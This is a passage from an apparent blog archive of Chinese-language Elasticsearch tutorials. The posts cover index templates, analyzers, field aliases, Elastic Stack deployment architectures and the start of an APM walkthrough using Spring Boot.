&#125;&#125;Index匹配多个template多个索引模板可能与索引匹配，在这种情况下，设置和映射都合并到索引的最终配置中。 可以使用order参数控制合并的顺序，首先应用较低的顺序，并且覆盖它们的较高顺序。 例如：1234567891011121314151617181920212223PUT /_template/template_1&#123; &quot;index_patterns&quot; : [&quot;*&quot;], &quot;order&quot; : 0, &quot;settings&quot; : &#123; &quot;number_of_shards&quot; : 1 &#125;, &quot;mappings&quot; : &#123; &quot;_source&quot; : &#123; &quot;enabled&quot; : false &#125; &#125;&#125; PUT /_template/template_2&#123; &quot;index_patterns&quot; : [&quot;te*&quot;], &quot;order&quot; : 1, &quot;settings&quot; : &#123; &quot;number_of_shards&quot; : 1 &#125;, &quot;mappings&quot; : &#123; &quot;_source&quot; : &#123; &quot;enabled&quot; : true &#125; &#125;&#125;以上的template_1将禁用存储_source，但对于以te *开头的索引，仍将启用_source。 注意，对于映射，合并是“深度”的，这意味着可以在高阶模板上轻松添加/覆盖特定的基于对象/属性的映射，而较低阶模板提供基础。我们可以来创建一个例子看看：123PUT test10 GET test10显示的结果是：123456789101112131415161718&#123; &quot;test10&quot; : &#123; &quot;aliases&quot; : &#123; &#125;, &quot;mappings&quot; : &#123; &#125;, &quot;settings&quot; : &#123; &quot;index&quot; : &#123; &quot;creation_date&quot; : &quot;1567654333181&quot;, &quot;number_of_shards&quot; : &quot;1&quot;, &quot;number_of_replicas&quot; : &quot;1&quot;, &quot;uuid&quot; : &quot;iEwaQFl9RAKyTt79PduN-Q&quot;, &quot;version&quot; : &#123; &quot;created&quot; : &quot;7030099&quot; &#125;, &quot;provided_name&quot; : &quot;test10&quot; &#125; &#125; &#125;&#125;如果我们创建另外一个不是以 “te”开头的index，我们可以看看如下的情况：12PUT my_test_indexGET my_test_index显示的结果是：12345678910111213141516171819202122&#123; &quot;my_test_index&quot; : &#123; &quot;aliases&quot; : &#123; &#125;, &quot;mappings&quot; : &#123; &quot;_source&quot; : &#123; &quot;enabled&quot; : false &#125; &#125;, &quot;settings&quot; : &#123; &quot;index&quot; : &#123; &quot;creation_date&quot; : &quot;1567654713059&quot;, &quot;number_of_shards&quot; : &quot;1&quot;, &quot;number_of_replicas&quot; : &quot;1&quot;, &quot;uuid&quot; : &quot;aSsIZMT2RyWKT44G2dF2zg&quot;, &quot;version&quot; : &#123; &quot;created&quot; : &quot;7030099&quot; &#125;, &quot;provided_name&quot; : &quot;my_test_index&quot; &#125; &#125; &#125;&#125;显然在mappings里显示source是被禁止的。如果对于两个templates来说，如果order是一样的话，我们可能陷于一种不可知论的合并状态。在实际的使用中必须避免。查询Index template接口我们可以通过如下的接口来查询已经被创建好的index template:1GET /_template/&lt;index-template&gt;比如：1GET _template/logs_template显示的结果是：123456789101112131415161718192021222324&#123; &quot;logs_template&quot; : &#123; &quot;order&quot; : 1, &quot;index_patterns&quot; : [ &quot;logs-*&quot; ], &quot;settings&quot; : &#123; &quot;index&quot; : &#123; &quot;number_of_shards&quot; : &quot;4&quot;, &quot;number_of_replicas&quot; : &quot;1&quot; &#125; &#125;, &quot;mappings&quot; : &#123; &quot;properties&quot; : &#123; &quot;@timestamp&quot; : &#123; &quot;type&quot; : &quot;date&quot; &#125; &#125; &#125;, &quot;aliases&quot; : &#123; &quot;&#123;index&#125;-alias&quot; : &#123; &#125; &#125; &#125;&#125;显示的内容就是我们之前已经创建的那个index template。你也可以通过如下的方式来同时查询多个template的情况：123GET /_template/template_1,template_2GET /_template/temp*GET /_template删除一个index template在之前的练习中，我们匹配“*”，也就是我们以后所有的创建的新的index将不存储source，这个显然不是我们所需要的。我们需要来把这个template进行删除。删除一个template的接口如下：1DELETE /_template/&lt;index-template&gt;那么针对我们的情况，我们可以使用如下的命令来删除我们不需要的template:12DELETE _template/template_1DELETE _template/template_2这样我们删除了我们刚才创建的两个templates。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/indices-get-template.html【2】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/indices-delete-template.html【3】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/indices-templates.html]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20analyzer%2F</url>
    <content type="text"><![CDATA[在今天的文章中，我们来进一步了解analyzer。 analyzer执行将输入字符流分解为token的过程，它一般发生在两个场合：在indexing的时候，也即在建立索引的时候在searching的时候，也即在搜索时，分析需要搜索的词语什么是analysis?分析是Elasticsearch在文档发送之前对文档正文执行的过程，以添加到反向索引中（inverted index）。 在将文档添加到索引之前，Elasticsearch会为每个分析的字段执行许多步骤：Character filtering (字符过滤器): 使用字符过滤器转换字符Breaking text into tokens (把文字转化为标记): 将文本分成一组一个或多个标记Token filtering：使用标记过滤器转换每个标记Token indexing：把这些标记存于index中接下来我们将更详细地讨论每个步骤，但首先让我们看一下图表中总结的整个过程。 图5.1显示了“share your experience with NoSql &amp; big data technologies”为分析的标记：share, your, experience, with, nosql, big, data，tools,及 technologies。上面所展示的是一个由character过滤器，标准的tokenizer及Token filter组成的定制analyzer。上面的这个图非常好，它很简洁地描述一个analyzer的基本组成部分，以及每个部分所需要表述的东西。每当一个文档被ingest节点纳入，它需要经历如下的步骤，才能最终把文档写入到Elasticsearch的数据库中：上面中间的那部分就叫做analyzer，即分析器。它有三个部分组成：Char Filters, Tokenizer及 Token Filter。它们的作用分别如下：Char Filter: 字符过滤器的工作是执行清除任务，例如剥离HTML标记，还有上面的把“&amp;”转换为“and”字符串Tokenizer: 下一步是将文本拆分为称为标记的术语。 这是由tokenizer完成的。 可以基于任何规则（例如空格）来完成拆分。 有关tokennizer的更多详细信息，请访问以下URL：https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-tokenizers.html。Token filter: 一旦创建了token，它们就会被传递给token filter，这些过滤器会对token进行规范化。 Token filter可以更改token，删除术语或向token添加术语。Elasticsearch已经提供了比较丰富的开箱即用analyzer。我们可以自己创建自己的token analyzer，甚至可以利用已经有的char filter，tokenizer及token filter来重新组合成一个新的analyzer，并可以对文档中的每一个字段分别定义自己的analyzer。如果大家对analyzer比较感兴趣的话，请参阅我们的网址https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-analyzers.html。在默认的情况下，standard analyzer是Elasticsearch的缺省分析器(https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-standard-analyzer.html)：没有 Char Filter使用standard tokonizer把字符串变为小写，同时有选择地删除一些stop words等。默认的情况下stop words为none，也即不过滤任何stop words。总体说来一个analyzer可以分为如下的几个部分：0个或1个以上的character filter1个tokenizer0个或1个以上的token filterAnalyze API1234GET /_analyzePOST /_analyzeGET /&lt;index&gt;/_analyzePOST /&lt;index&gt;/_analyze使用_analyze API来测试analyzer如何解析我们的字符串的，比如：12345GET /_analyze&#123; &quot;analyzer&quot;: &quot;standard&quot;, &quot;text&quot;: &quot;Quick Brown Foxes!&quot;&#125;返回结果：123456789101112131415161718192021222324 &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;quick&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 5, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;brown&quot;, &quot;start_offset&quot; : 6, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;foxes&quot;, &quot;start_offset&quot; : 12, &quot;end_offset&quot; : 17, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 2 &#125; ]&#125;在这里我们使用了standard分析器，它把我们的字符串分解为三个token，并显示它们分别的位置信息。Multi-field字符字段我们可以针对这个使用多个不同的anaylzer来提高我们的搜索：使用不同的分析器来分析同样的一个字符串，用不同的方式。我们可以使用现有的分析器俩设置一个定制的分析器。比如我们定义如下的一个mapping:1234567891011121314151617PUT multifield&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;standard&quot;, &quot;fields&quot;: &#123; &quot;english&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;english&quot; &#125; &#125; &#125; &#125; &#125;&#125;在这里我们定义了一个叫做multifield的index，我们可以对这个index进行分析。我们对整个field定义了一个standard分析器，同时为叫做english的字段定义了一个english的分析器，这样有利于我们删除一些stop words及运用一些同根词。我们首先来为multifield来建立一个文档：1234PUT multifield/_doc/1&#123; &quot;content&quot;: &quot;We are excited to introduce the world to X-Pack&quot;&#125;那么我们可以通过如下的方法来进行搜索：12345678GET /multifield/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;the&quot; &#125; &#125;&#125;我们可以看到搜索的结果：12345678910111213141516171819202122232425262728&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.2876821, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;multifield&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.2876821, &quot;_source&quot; : &#123; &quot;content&quot; : &quot;We are excited to introduce the world to X-Pack&quot; &#125; &#125; ] &#125;&#125;我们可以看到搜寻的结果，但是如果我们使用如下的方法：12345678GET /multifield/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content.english&quot;: &quot;the&quot; &#125; &#125;&#125;我们啥也看不到，这是因为“the”在english analyzer里“the”被认为是stop word，而被忽略。如何定义一个定制的分析器在这里我们主要运用现有的plugin来完成定制的分析器。对于需要开发自己的plugin的需求，不在这篇文章的范围。假如我们有一下的一个句子：12345GET _analyze&#123; &quot;text&quot;: &quot;I am so excited to go to the x-school&quot;, &quot;analyzer&quot;: &quot;standard&quot;&#125;我们可以看到这样的结果：1234567891011121314&#123; &quot;token&quot; : &quot;x&quot;, &quot;start_offset&quot; : 29, &quot;end_offset&quot; : 30, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 8&#125;,&#123; &quot;token&quot; : &quot;school&quot;, &quot;start_offset&quot; : 31, &quot;end_offset&quot; : 37, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 9&#125;x-school在这里被分为两个token：x 及 school。如果我们想把x-school当做一个该怎么办呢？我们可以通过设置特有的mapping来实现，比如我们有一个叫做blog的index：1234567891011121314151617181920212223242526272829303132333435PUT blogs&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;char_filter&quot;: &#123; &quot;xschool_filter&quot;: &#123; &quot;type&quot;: &quot;mapping&quot;, &quot;mappings&quot;: [ &quot;X-School =&gt; XSchool&quot; ] &#125; &#125;, &quot;analyzer&quot;: &#123; &quot;my_content_analyzer&quot;: &#123; &quot;type&quot;: &quot;custom&quot;, &quot;char_filter&quot;: [ &quot;xschool_filter&quot; ], &quot;tokenizer&quot;: &quot;standard&quot;, &quot;filter&quot;: [ &quot;lowercase&quot; ] &#125; &#125; &#125; &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot; &#125; &#125; &#125; &#125;大家请注意在settings里的“analysis”部分，我们定义了一个称之为xschool_filter的char_filter，它可以帮我们把“x-school”转化为“XSchool”。紧接着，我们利用xschool_filter定义了一个叫做“my_content_analyzer”。它是一个定制的类型。我们定义它的char_filter， tokenizer及filter。现在我们可以利用我们刚才定义my_content_analyzer来分析我们的字符串。我们在mappings里可以看到：12345678&quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot; &#125; &#125;&#125;在这里，我们使用了我们刚才在analysis里定义的my_content_analyzer分析器。我们可以通过如下的方法来测试它是否工作：12345POST blogs/_analyze&#123; &quot;text&quot;: &quot;I am so excited to go to the X-School&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot;&#125;我们可以看到如下的结果：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;i&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 1, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;am&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 4, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;so&quot;, &quot;start_offset&quot; : 5, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;excited&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 15, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;to&quot;, &quot;start_offset&quot; : 16, &quot;end_offset&quot; : 18, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;go&quot;, &quot;start_offset&quot; : 19, &quot;end_offset&quot; : 21, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 5 &#125;, &#123; &quot;token&quot; : &quot;to&quot;, &quot;start_offset&quot; : 22, &quot;end_offset&quot; : 24, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 6 &#125;, &#123; &quot;token&quot; : &quot;the&quot;, &quot;start_offset&quot; : 25, &quot;end_offset&quot; : 28, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 7 &#125;, &#123; &quot;token&quot; : &quot;xschool&quot;, &quot;start_offset&quot; : 29, &quot;end_offset&quot; : 37, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 8 &#125; ]&#125;在这里，我们可以看到“xschool”这个token。从上面的返回的结果来看，我们还是可以看到“the”，“to”这样的token。如果我们想去掉这些token的话，我们可以做做如下的设置：1234567891011121314151617181920212223242526272829303132333435363738394041424344DELETE blogs PUT blogs&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;char_filter&quot;: &#123; &quot;xschool_filter&quot;: &#123; &quot;type&quot;: &quot;mapping&quot;, &quot;mappings&quot;: [ &quot;X-School =&gt; XSchool&quot; ] &#125; &#125;, &quot;analyzer&quot;: &#123; &quot;my_content_analyzer&quot;: &#123; &quot;type&quot;: &quot;custom&quot;, &quot;char_filter&quot;: [ &quot;xschool_filter&quot; ], &quot;tokenizer&quot;: &quot;standard&quot;, &quot;filter&quot;: [ &quot;lowercase&quot;, &quot;my_stop&quot; ] &#125; &#125;, &quot;filter&quot;: &#123; &quot;my_stop&quot;: &#123; &quot;type&quot;: &quot;stop&quot;, &quot;stopwords&quot;: [&quot;so&quot;, &quot;to&quot;, &quot;the&quot;] &#125; &#125; &#125; &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot; &#125; &#125; &#125;&#125;在这里，我们重新加入了一个叫做my_stop的过滤器：123456&quot;filter&quot;: &#123; &quot;my_stop&quot;: &#123; &quot;type&quot;: &quot;stop&quot;, &quot;stopwords&quot;: [&quot;so&quot;, &quot;to&quot;, &quot;the&quot;] &#125;&#125;我们在我们自己定制的分析器中也加入了my_stop。重新运行我们的分析：12345POST blogs/_analyze&#123; &quot;text&quot;: &quot;I am so excited to go to the X-School&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot;&#125;在上面我们把so, to及the作为stop words去掉了。重新运行我们的分析：12345POST blogs/_analyze&#123; &quot;text&quot;: &quot;I am so excited to go to the X-School&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot;&#125;显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;i&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 1, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;am&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 4, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;excited&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 15, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;go&quot;, &quot;start_offset&quot; : 19, &quot;end_offset&quot; : 21, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 5 &#125;, &#123; &quot;token&quot; : &quot;xschool&quot;, &quot;start_offset&quot; : 29, &quot;end_offset&quot; : 37, &quot;type&quot; : &quot;&lt;ALPHANUM&gt;&quot;, &quot;position&quot; : 8 &#125; ]&#125;我们可以看到so, the及to都被过滤掉了。Filter的顺序也很重要我们来试一下下面的一个例子：123456789GET _analyze&#123; &quot;tokenizer&quot;: &quot;whitespace&quot;, &quot;filter&quot;: [ &quot;lowercase&quot;, &quot;stop&quot; ], &quot;text&quot;: &quot;To Be Or Not To Be&quot;&#125;在这里我们先进行lowercase的过滤器，先变成小写字母，再进行stop过滤器，那么返回的结果是[]，也即没有。相反，如果我们使用如下的顺序：123456789GET _analyze&#123; &quot;tokenizer&quot;: &quot;whitespace&quot;, &quot;filter&quot;: [ &quot;stop&quot;, &quot;lowercase&quot; ], &quot;text&quot;: &quot;To Be Or Not To Be&quot;&#125;这里先进行stop过滤器，因为这里的词有些是大写字母，所以不被认为是stop词，那么没有被过滤掉。之后进行lowercase，显示的结果是to, be, or, not, to, be这些token。search_analyzer也许大家已经看出来了，每当一个文档在被录入到Elasticsearch中时，需要一个叫做index的过程。在Index的过程中，它会为该字符串进行分词，并最终形成一个一个的token，并存于数据库。但是，每当我们搜索一个字符串时，在搜索时，我们同样也要对该字符串进行分词，也会建立token。当然这些token不会被存放于数据库中。比如：12345678GET /chinese/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Happy a birthday&quot; &#125; &#125;&#125;对于这个搜索来说，我们在默认的情况下，会把”Happy a birthday”使用同样的analyzer进行分词。如果我们的analyzer里含有stop过滤器，它极有可能把字母“a”过滤掉，那么直剩下“happy”及“birthday”这两个词，而“a”将不进入搜索之中。在实际的使用中，我们也可以通过如下的方法对搜索进行制定具体的search_analyzer。12345678910111213141516171819202122232425262728293031323334353637383940414243PUT blogs&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;char_filter&quot;: &#123; &quot;xschool_filter&quot;: &#123; &quot;type&quot;: &quot;mapping&quot;, &quot;mappings&quot;: [ &quot;X-School =&gt; XSchool&quot; ] &#125; &#125;, &quot;analyzer&quot;: &#123; &quot;my_content_analyzer&quot;: &#123; &quot;type&quot;: &quot;custom&quot;, &quot;char_filter&quot;: [ &quot;xschool_filter&quot; ], &quot;tokenizer&quot;: &quot;standard&quot;, &quot;filter&quot;: [ &quot;lowercase&quot;, &quot;my_stop&quot; ] &#125; &#125;, &quot;filter&quot;: &#123; &quot;my_stop&quot;: &#123; &quot;type&quot;: &quot;stop&quot;, &quot;stopwords&quot;: [&quot;so&quot;, &quot;to&quot;, &quot;the&quot;] &#125; &#125; &#125; &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;my_content_analyzer&quot;, &quot;search_analyzer&quot;: &quot;standard&quot; &#125; &#125; &#125;&#125;在上面，我们可以看到，我们分别定义了不用的analyzer：在录入文档时，我们使用了my_content_analyzer分析器，而在搜索时，我们使用了standard分析器。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20alias%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[就像其他的很多语言一样，我们可以给已有的变量取一个别名（alias）。即便是对高级语言一样，比如我们定义不同的指针变量，指向同一个内存空间。这个有些类似别名的概念。在Elasticsearch中，我们也可以为index中的一个字段（field）取一个另外的名字：它可以用来代替搜索请求中的目标（target）字段以及其它的被选定的API中通常alias可以用来帮助我们重新命名一个字段，并让这个字段的名称符合我们的命名规则。我们可以参考ECS。通过alias的使用，可以使得我们的字段根据符合ECS标准。一个字段的alias只能有一个目标字段。在使用alias时，字段别名的目标有一些限制：它必须是一个具体的字段（不是一个对象或者是另外一个alias）它必须在alias被创建时已经存在如果是一个nested的对象，那么alias必须具有和它的目标具有同样的nested scope一个alias的应用例子下面，我们来用一个具体的例子来说说明。我们首先来定义一个index的mapping如下：1234567891011121314151617PUT trips&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;distance&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;route_length_miles&quot;: &#123; &quot;type&quot;: &quot;alias&quot;, &quot;path&quot;: &quot;distance&quot; &#125;, &quot;transit_mode&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125; &#125; &#125;&#125;现在我们输入一下的两个文档，并搜索：12345678910111213141516171819202122PUT trips/_doc/1&#123; &quot;distance&quot;: 100, &quot;transit_mode&quot;: &quot;mode1&quot;&#125; PUT trips/_doc/2&#123; &quot;distance&quot;: 50, &quot;transit_mode&quot;: &quot;mode2&quot;&#125; GET _search&#123; &quot;query&quot;: &#123; &quot;range&quot; : &#123; &quot;route_length_miles&quot; : &#123; &quot;gte&quot; : 60 &#125; &#125; &#125;&#125;显示的结果是：1234567891011121314151617181920212223242526272829&#123; &quot;took&quot; : 346, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 20, &quot;successful&quot; : 20, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;trips&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;distance&quot; : 100, &quot;transit_mode&quot; : &quot;mode1&quot; &#125; &#125; ] &#125;&#125;从上面可以看出来，虽然我们没有使用在source中的distance，但是我们使用它的别名route_length_miles，我们可以照样把我们的统计数据搜索出来。不被支持的API不支持写入字段别名：尝试在索引或更新请求中使用别名将导致失败。 同样，别名不能用作copy_to的目标或多字段。由于文档源中不存在别名，因此在执行源过滤时不能使用别名。 例如，以下请求将返回_source的空结果：不支持写入字段别名：尝试在索引或更新请求中使用别名将导致失败。 同样，别名不能用作copy_to的目标或多字段。由于文档源中不存在别名，因此在执行源过滤时不能使用别名。 例如，以下请求将返回_source的空结果：]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElastic%EF%BC%9AElastic%E9%83%A8%E7%BD%B2%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[Elastic Stack是一套完整的从数据采集，解析，分析，丰富，到搜索，检索，数据程序等一套完整的软件栈。在具体的实践中，我们应该如何搭建我们的系统呢？下图描述了常用的Elastic Stack的部署架构：该图描述了三种可能的体系结构：将操作指标直接发送到Elasticsearch：如上图所示，您将在要从其发送操作指标/日志的边缘服务器上安装各种类型的Beats，例如Metricbeat，Filebeat，Packetbeat等。 如果不需要进一步处理，那么可以将生成的事件直接传送到Elasticsearch集群。 一旦数据出现在Elasticsearch中，就可以使用Kibana对其进行可视化/分析。 在这种体系结构中，事件流将是Beats→Elasticsearch→Kibana。当然如果您需要做进一步的处理，您也可以通过ingest node的pipleline帮助实现。将操作指标发送到Logstash：Beats捕获并安装在边缘服务器上的操作指标/日志将发送到Logstash进行进一步处理，例如解析日志或丰富日志事件。 然后，已解析/丰富的事件被推送到Elasticsearch。 为了提高处理能力，您可以扩展Logstash实例，例如，通过配置一组Beats将数据发送到Logstash实例1，并配置另一组Beats将数据发送到Logstash实例2，依此类推。 在这种架构中，事件流将是Beats→Logstash→Elasticsearch→Kibana。将操作指标发送到弹性队列：如果生成的事件发生率很高，并且Logstash停机时Logstash无法应付负载或防止数据/事件丢失，则可以使用诸如以下的弹性队列 Apache Kafka，以便将事件排队。 然后，Logstash可以以自己的速度处理它们，从而避免丢失Beats捕获的操作指标/日志。 在这种体系结构中，事件流将是Beats→Kafka→Logstash→Elasticsearch→Kibana。提示：从Logstash 5.x开始，您可以使用Logstash的持久队列设置，也可以将其用作队列。 但是，它不像Kafka一样提供高度的弹性。也有一些应用场景是这样部署的：同样的，在这里，我们可以通过radis或Kafaka来提供一个弹性队列来缓冲高发生率事件。在实际的使用中，如果我们不把Elasticsearch当做唯一的数据库来存储的话，那么，我们可以采用如下的方案：在这种架构中，您有两个数据存储，必须找到一种使它们保持同步的方法。 根据您的主要数据存储区和数据布局方式，您可以部署Elasticsearch插件以使两个实体保持同步。如下的是另外一中有外部数据，物联网等的一种架构：或者一个更加全面的架构图：在Elastic的官方文档中，有更多关于部署架构的描述。详细文档：https://www.elastic.co/assets/blt2614227bb99b9878/architecture-best-practices.pdf]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElastic%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%20%E7%AE%A1%E7%90%86(APM)%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[在今天的文章里，我们将介绍Elastic的一个重要的应用：应用程序性能管理（Application Performance Monitoring/Management)，简称APM。那么到底什么是APM呢？随着时代的发展，我们的IT架构越来越复杂，比如：我们系统的服务器越来越多，而且更多的设备都部署在云端。复杂的系统甚至有成千个微服务及架构所组成，那么我们的业务请求可能需要一个或更多的服务共同来完成。那么现在的问题是，如果我们的请求变得很慢，我们想知道到底是哪个环节出现问题了呢？经验丰富的程序员或者系统设计者，可能从一些log里找到答案。可是当我们的log变得非常大的时候，而且我们的接口也越来越多时，这个时候，也许我们也无能为力。当我们在设计页面或者请求时，经常会遇到上面的这种等待的情况。可能有个别的工具能有效地解决部分的问题，但是如何能从整个的系统里来完成这种问题的定位及分析。Elastic推出的APM解决方案可以完美地解决这些问题。为我们的系统设计者或程序员提供了一个快速定位的方法。APM 到底是什么呢？我们先来看一下如下的这个图：如上图所示，在不同时刻我们请求时，我们发现为什么在17:36:30发生的一个请求需要花将近8秒的时间，而另外在17:36:30分发生的一个请求却返回一个错误的代码？Elastic APM方案是世界上第一个开源的APM 解决方案：APM记录数据库查询，外部HTTP请求以及对应用程序的请求期间发生的其他缓慢操作的跟踪很容易让程序员看到应用在运行时各个部分所花的时间它收集未处理的错误和异常很容让程序员调试错误在客户面对性能瓶颈和错误之前先定位到问题所在提高开发团队的生产力APM适用于Elastic Stack的位置APM如何把数据存于Elasticsearch中，并提供分析呢？我们看一下如下的架构图：如上图所示，我们看到一个最典型的APM架构图：我们需要架设一台专门的APM服务器，虽然也可以和Elastic Stack的其它服务器处于同一台服务器中AMP agent专门收集数据并发送数据到APM服务器中。这里的APM agents包含：APM服务器把数据发送到Elasticsearch中，并进行数据分析Kibana可以帮我们把数据进行展示并显示在Dashboard之中总体来说，APM数据仅仅是另外Elasticsearch索引。在Kibana中已经有一个现成的APM应用可以被我们所使用。我们也可以根据需求自己定制自己的Dashboard。APM可以完美地结合机器学习和告警。APM术语Service: 在apm agent配置中进行设置，以将特定的apm agent组标识为单个服务，这是一种逻辑上标识一组事务的方法Transaction: 组成一个服务的请求和响应，例如 登录api调用，每个调用由单独的span组成。Span: 事务中的单个事件，例如方法调用，数据库查询或缓存插入或检索，即需要花费时间才能完成的任何事件。Erorrs：具有匹配的异常或日志消息的异常组它们之间的关系可以用如下的图来表示：分布式tracing：例子在今天的练习中，我们将以Java Spring boot为例来展示如何使用Elastic APM。下载Spring boot代码首先，我们在terminal中打入如下的命令：1git clone https://github.com/liu-xiao-guo/elastic-apm-demo上面的一个例子是一个简单的Spring boot应用。它有一下的几个特点：它可以REST接口访问MySQL的数据库进行添加数据，请求数据它可以通过REST接口进行访问百度天气接口来获得天气数据下面是它的部分代码：123456789101112131415161718192021222324252627282930@PostMapping(path=&quot;/add&quot;) // Map ONLY POST Requestspublic @ResponseBody String addNewUser (@RequestParam String name , @RequestParam String email) &#123; // @ResponseBody means the returned String is the response, not a view name // @RequestParam means it is a parameter from the GET or POST request User n = new User(); n.setName(name); n.setEmail(email); userRepository.save(n); return &quot;Saved&quot;;&#125;@GetMapping(path=&quot;/all&quot;)public @ResponseBody Iterable&lt;User&gt; getAllUsers() &#123; // This returns a JSON or XML with the users return 